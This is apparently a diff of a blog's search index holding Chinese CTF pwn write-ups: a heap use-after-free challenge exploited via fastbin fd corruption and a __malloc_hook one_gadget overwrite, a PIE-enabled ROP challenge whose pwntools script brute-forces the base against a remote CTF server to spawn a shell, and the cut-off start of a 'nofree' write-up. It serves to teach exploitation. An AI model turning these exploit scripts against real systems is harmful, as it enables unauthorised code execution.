<span class="built_in">puts</span>(<span class="string">&quot;Add successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">edit</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> nbytes; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  v1 = get_int(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">56</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytes = <span class="number">104</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v1 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(<span class="number">8L</span>L * (v1 - <span class="number">1</span>) + a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your info?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, *(<span class="keyword">void</span> **)(<span class="number">8L</span>L * v4 + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">    *(_QWORD *)(<span class="number">8L</span>L * nbytes - <span class="number">8</span> + a1) = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Edit successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">delete</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want to remove?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  v2 = get_int(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="number">1</span> &amp;&amp; v2 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(<span class="number">8L</span>L * (v2 - <span class="number">1</span>) + a1));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Remove successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shiroha@ubuntu:~/kaohe$ checksec heap</span><br><span class="line">[*] &#x27;/home/gstalker/kaohe/heap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><code>add</code>函数只允许3种堆块<br><code>edit</code>只允许修改两种<br><code>delete</code>也只允许释放两种<br>(那么第三种有什么用啊喂)</p>
+<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>由于在<code>delete</code>之后没有讲指针置0,存在**<code>UAF</code>**漏洞,并且在<code>edit</code>的时候没有检查堆块是否已经被<code>free</code>,所以可以通过修改<code>fastbin</code>的<code>fd</code>指针达到任意地址写</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>首先完善一下各个功能</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;3. edit a block&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;3. large&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your info?&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;2. big&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your info?&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;2. big&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
+
+<h4 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h4><p>一开始我想通过<code>unsorted bin</code>的<code>UAF</code>,但是这里并没有办法(甚至没有<code>unsorted bin</code>)<br>于是试图通过<code>fastbin</code>的<code>fd</code>指针分配到<code>got表</code>附近,泄露<code>libc</code><br>查看一下 <code>got表</code>,寻找合适的size</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:	0x0000000000601e28	0x00007f1287400168</span><br><span class="line">0x602010:	0x00007f12871f0ee0	0x00000000004006a6</span><br><span class="line">0x602020:	0x00007f1286e7e690	0x00000000004006c6</span><br><span class="line">0x602030:	0x00000000004006d6	0x00007f1286f06250</span><br><span class="line">0x602040:	0x00007f1286e2f740	0x00007f1286e93130</span><br><span class="line">0x602050:	0x00007f1286e7ee70	0x0000000000400726</span><br><span class="line">0x602060:	0x0000000000400736	0x0000000000000000</span><br><span class="line">0x602070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602080 &lt;stdout&gt;:	0x00007f12871d4620	0x0000000000000000</span><br><span class="line">0x602090 &lt;stdin&gt;:	0x00007f12871d38e0	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>看到在<code>0x602050</code>的地方有一个 <code>0x70</code>,高兴坏了,然而并不能分配到这里,而且就算是这附近的错位字节也不行(我在这里卡了好久没弄明白为什么,然后看了看<code>__malloc_hook-0x23</code>,发现错位字节的地方是<code>0x7f</code>)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x7f12871d3aed &lt;_IO_wide_data_0+301&gt;:	0x12871d2260000000	0x000000000000007f</span><br><span class="line">0x7f12871d3afd:	0x1286e94e20000000	0x1286e94a0000007f</span><br><span class="line">0x7f12871d3b0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>猜想可能是size检查的时候是一个<code>int</code>为单位,再次寻找size,发现<code>0x602030</code>的地方有一个<code>0x40</code>可以利用,但是会失败,可以分配到,然而<code>0x602038</code>是<code>read</code>函数,会破坏它的指针,从而影响程序<br>最后看到<code>0x602060</code>的地方也有<code>0x40</code>,并且下面存在<code>stdin</code>和<code>stdout</code>可以泄露,将<code>fd</code>指向这里</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x60205a</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">c = sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">addr = u64(c)</span><br><span class="line">print(<span class="string">&quot;addr ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">base = addr - libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]</span><br><span class="line">print(<span class="string">&quot;base ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(base))</span><br></pre></td></tr></table></figure>
+<h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><p>得到libc之后使用修改<code>__malloc_hook ==&gt; one_gadget</code> 就可以得到shell</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">onegadget = base + one[<span class="number">3</span>]</span><br><span class="line">realloc = base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">malloc_hook = base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span> + p64(onegadget) + p64(realloc + <span class="number">0x10</span>))</span><br></pre></td></tr></table></figure>
+<p>再一次分配一个堆块就能得到shell</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+        <category>heap</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>heap</tag>
       </tags>
   </entry>
   <entry>
@@ -2238,39 +2460,6 @@
       </tags>
   </entry>
   <entry>
-    <title>一道开了pie的ROP题</title>
-    <url>//pie-rop.html</url>
-    <content><![CDATA[<p>main函数的ROP以及开启pie</p>
-<a id="more"></a>
-
-<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+0h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stderr, 0LL, 2, 0LL);</span><br><span class="line">  read_n(&amp;s, 0x100uLL);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">                                </span><br></pre></td></tr></table></figure>
-
-<h3 id="read-n"><a href="#read-n" class="headerlink" title="read_n"></a>read_n</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void *__fastcall read_n(void *a1, unsigned __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; &#x2F;&#x2F; eax</span><br><span class="line">  char s[520]; &#x2F;&#x2F; [rsp+10h] [rbp-210h]</span><br><span class="line">  int v5; &#x2F;&#x2F; [rsp+218h] [rbp-8h]</span><br><span class="line">  int v6; &#x2F;&#x2F; [rsp+21Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v6 &#x3D; 0;</span><br><span class="line">  if ( a2 &gt; 0x200 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;too long!&quot;);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, &amp;s[v6], 1uLL);</span><br><span class="line">    if ( s[v6] &#x3D;&#x3D; 10 )</span><br><span class="line">      break;</span><br><span class="line">    if ( !s[v6] )</span><br><span class="line">      break;</span><br><span class="line">    v2 &#x3D; v6++;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( a2 &gt; v2 );</span><br><span class="line">  if ( s[v6] &#x3D;&#x3D; 10 &amp;&amp; a2 &gt; v6 )</span><br><span class="line">    s[v6] &#x3D; 0;</span><br><span class="line">  v5 &#x3D; strlen(s);</span><br><span class="line">  return memcpy(a1, s, v5);</span><br><span class="line">&#125;</span><br><span class="line">                                </span><br></pre></td></tr></table></figure>
-
-<p>漏洞点是main函数存在栈溢出</p>
-<p>但是main函数结束之后的返回地址是 <code>__libc_start_main+231</code></p>
-<img src="./pie-rop/main_ret.jpg" alt="main_ret" style="zoom:25%;" />
-
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>观察到<code>ret+0x20</code>的地方是main函数的入口地址，所以只要让函数在ret的时候，ret到<code>__libc_start_main</code>附近的 <code>pop pop pop ret</code> 就可以返回到main函数</p>
-<p>于此同时，之前的puts函数会泄漏libc的地址</p>
-<p>由于开了pie，导致程序的基址不确定，但是最后的12位是确定的，有4位不确定，需要爆破。有1/16的概率成功。 找一个合适的pppr地址</p>
-<img src="./pie-rop/ropgadget.png" alt="ropgadget" style="zoom:25%;" />
-
-<p>返回到main之后就是基础的rop了</p>
-<img src="./pie-rop/getshell.png" alt="getshell" style="zoom:25%;" />
-
-<h2 id="完整的exp"><a href="#完整的exp" class="headerlink" title="完整的exp"></a>完整的exp</h2><p>本来想用<code>system(&quot;/bin/sh&quot;);</code>的，但是失败了，因为read_n函数会在读取到\x00的时候截断。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; 0</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def dbg(command &#x3D; &quot;&quot;):</span><br><span class="line">    global sh</span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    input()</span><br><span class="line"></span><br><span class="line">def leakBase():</span><br><span class="line">    global sh</span><br><span class="line">    #sh &#x3D; process(&quot;.&#x2F;easypwn&quot;, env&#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;&#x2F;mnt&#x2F;hgfs&#x2F;sharedPwn&#x2F;a&#x2F;libc-2.27.so&quot;&#125;)</span><br><span class="line">    sh &#x3D; remote(&quot;nc.eonew.cn&quot;,&quot;10004&quot;)</span><br><span class="line">    payload &#x3D; &#39;a&#39; * 0x88 + &#39;\x51&#39; + &#39;\x13&#39;</span><br><span class="line">    #dbg(&quot;codebase&quot;)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    c &#x3D; sh.recvline()[-7:-1].ljust(8, &#39;\x00&#39;)</span><br><span class="line">    addr &#x3D; u64(c) - 0x0000000000021351</span><br><span class="line">    print(&quot;libc &#x3D;&#x3D;&gt; &quot; + hex(addr))</span><br><span class="line">    return addr</span><br><span class="line"></span><br><span class="line">while(1):</span><br><span class="line">    try:</span><br><span class="line">        base &#x3D; leakBase()</span><br><span class="line">        pop_rdi &#x3D; 0x000000000002155f + base</span><br><span class="line">        libc &#x3D; ELF(&quot;&#x2F;mnt&#x2F;hgfs&#x2F;sharedPwn&#x2F;a&#x2F;libc-2.27.so&quot;)</span><br><span class="line">        system &#x3D; base + 0x4f322</span><br><span class="line">        sleep(0.3)</span><br><span class="line">        print(&quot;system &#x3D;&#x3D;&gt; &quot; + hex(system))</span><br><span class="line">        payload &#x3D; &#39;a&#39; * 0x88 + p64(system)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        sh.sendline(&quot;ls&quot;)</span><br><span class="line">        sh.interactive()</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>pwn</category>
-        <category>ROP</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>ROP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>one_gadget条件的探寻</title>
     <url>//one_gadget.html</url>
     <content><![CDATA[<p>one_gadget的条件并没有那么苛刻，有很大的宽限余地</p>
@@ -2369,6 +2558,39 @@
       </tags>
   </entry>
   <entry>
+    <title>一道开了pie的ROP题</title>
+    <url>//pie-rop.html</url>
+    <content><![CDATA[<p>main函数的ROP以及开启pie</p>
+<a id="more"></a>
+
+<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+0h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stderr, 0LL, 2, 0LL);</span><br><span class="line">  read_n(&amp;s, 0x100uLL);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">                                </span><br></pre></td></tr></table></figure>
+
+<h3 id="read-n"><a href="#read-n" class="headerlink" title="read_n"></a>read_n</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void *__fastcall read_n(void *a1, unsigned __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; &#x2F;&#x2F; eax</span><br><span class="line">  char s[520]; &#x2F;&#x2F; [rsp+10h] [rbp-210h]</span><br><span class="line">  int v5; &#x2F;&#x2F; [rsp+218h] [rbp-8h]</span><br><span class="line">  int v6; &#x2F;&#x2F; [rsp+21Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v6 &#x3D; 0;</span><br><span class="line">  if ( a2 &gt; 0x200 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;too long!&quot;);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    read(0, &amp;s[v6], 1uLL);</span><br><span class="line">    if ( s[v6] &#x3D;&#x3D; 10 )</span><br><span class="line">      break;</span><br><span class="line">    if ( !s[v6] )</span><br><span class="line">      break;</span><br><span class="line">    v2 &#x3D; v6++;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( a2 &gt; v2 );</span><br><span class="line">  if ( s[v6] &#x3D;&#x3D; 10 &amp;&amp; a2 &gt; v6 )</span><br><span class="line">    s[v6] &#x3D; 0;</span><br><span class="line">  v5 &#x3D; strlen(s);</span><br><span class="line">  return memcpy(a1, s, v5);</span><br><span class="line">&#125;</span><br><span class="line">                                </span><br></pre></td></tr></table></figure>
+
+<p>漏洞点是main函数存在栈溢出</p>
+<p>但是main函数结束之后的返回地址是 <code>__libc_start_main+231</code></p>
+<img src="./pie-rop/main_ret.jpg" alt="main_ret" style="zoom:25%;" />
+
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>观察到<code>ret+0x20</code>的地方是main函数的入口地址，所以只要让函数在ret的时候，ret到<code>__libc_start_main</code>附近的 <code>pop pop pop ret</code> 就可以返回到main函数</p>
+<p>于此同时，之前的puts函数会泄漏libc的地址</p>
+<p>由于开了pie，导致程序的基址不确定，但是最后的12位是确定的，有4位不确定，需要爆破。有1/16的概率成功。 找一个合适的pppr地址</p>
+<img src="./pie-rop/ropgadget.png" alt="ropgadget" style="zoom:25%;" />
+
+<p>返回到main之后就是基础的rop了</p>
+<img src="./pie-rop/getshell.png" alt="getshell" style="zoom:25%;" />
+
+<h2 id="完整的exp"><a href="#完整的exp" class="headerlink" title="完整的exp"></a>完整的exp</h2><p>本来想用<code>system(&quot;/bin/sh&quot;);</code>的，但是失败了，因为read_n函数会在读取到\x00的时候截断。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; 0</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def dbg(command &#x3D; &quot;&quot;):</span><br><span class="line">    global sh</span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    input()</span><br><span class="line"></span><br><span class="line">def leakBase():</span><br><span class="line">    global sh</span><br><span class="line">    #sh &#x3D; process(&quot;.&#x2F;easypwn&quot;, env&#x3D;&#123;&quot;LD_PRELOAD&quot;:&quot;&#x2F;mnt&#x2F;hgfs&#x2F;sharedPwn&#x2F;a&#x2F;libc-2.27.so&quot;&#125;)</span><br><span class="line">    sh &#x3D; remote(&quot;nc.eonew.cn&quot;,&quot;10004&quot;)</span><br><span class="line">    payload &#x3D; &#39;a&#39; * 0x88 + &#39;\x51&#39; + &#39;\x13&#39;</span><br><span class="line">    #dbg(&quot;codebase&quot;)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    c &#x3D; sh.recvline()[-7:-1].ljust(8, &#39;\x00&#39;)</span><br><span class="line">    addr &#x3D; u64(c) - 0x0000000000021351</span><br><span class="line">    print(&quot;libc &#x3D;&#x3D;&gt; &quot; + hex(addr))</span><br><span class="line">    return addr</span><br><span class="line"></span><br><span class="line">while(1):</span><br><span class="line">    try:</span><br><span class="line">        base &#x3D; leakBase()</span><br><span class="line">        pop_rdi &#x3D; 0x000000000002155f + base</span><br><span class="line">        libc &#x3D; ELF(&quot;&#x2F;mnt&#x2F;hgfs&#x2F;sharedPwn&#x2F;a&#x2F;libc-2.27.so&quot;)</span><br><span class="line">        system &#x3D; base + 0x4f322</span><br><span class="line">        sleep(0.3)</span><br><span class="line">        print(&quot;system &#x3D;&#x3D;&gt; &quot; + hex(system))</span><br><span class="line">        payload &#x3D; &#39;a&#39; * 0x88 + p64(system)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        sh.sendline(&quot;ls&quot;)</span><br><span class="line">        sh.interactive()</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>pwn</category>
+        <category>ROP</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ROP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>unlink</title>
     <url>//unlink.html</url>
     <content><![CDATA[<p>Linux 下堆溢出unlink实例。</p>
@@ -2405,228 +2627,6 @@
       <tags>
         <tag>pwn</tag>
         <tag>heap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ciscn初赛-nofree</title>
-    <url>//ciscn_nofree.html</url>
-    <content><![CDATA[<p>2020年国赛 初赛pwn题</p>
-<p>由于我是懒狗，现在才想起来写wp（</p>
-<a id="more"></a>
-
-
-
-<h1 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h1><h2 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916171504771.png" alt="image-20200916171504771"></p>
-<p>没有开<code>pie</code>和<code>pelro</code></p>
-<h2 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbufs();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = menu();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    edit(a1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009EF</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Management:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1- New &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2- Edit&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;choice&gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> get_int();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>正如描述的那样，没有<code>free</code>选项</p>
-<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_index();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    result = get_int();</span><br><span class="line">    v2 = result;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)result &lt;= <span class="number">144</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">256</span>] = get_content(result);</span><br><span class="line">      result = v2;</span><br><span class="line">      *(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">264</span>] = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>会分配一个堆块，并且把<code>size</code>写进结构体</p>
-<p>但是分配堆块的大小，不是由<code>size</code>决定，而是由<code>strlen(content)</code>决定</p>
-<p>导致了溢出</p>
-<p>并且在add的时候，没有检查堆块是否已经存在，导致无限申请</p>
-<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_index();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_QWORD *)&amp;heapArray[<span class="number">16</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)result + <span class="number">256</span>];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">      result = sub_400916(*(_QWORD 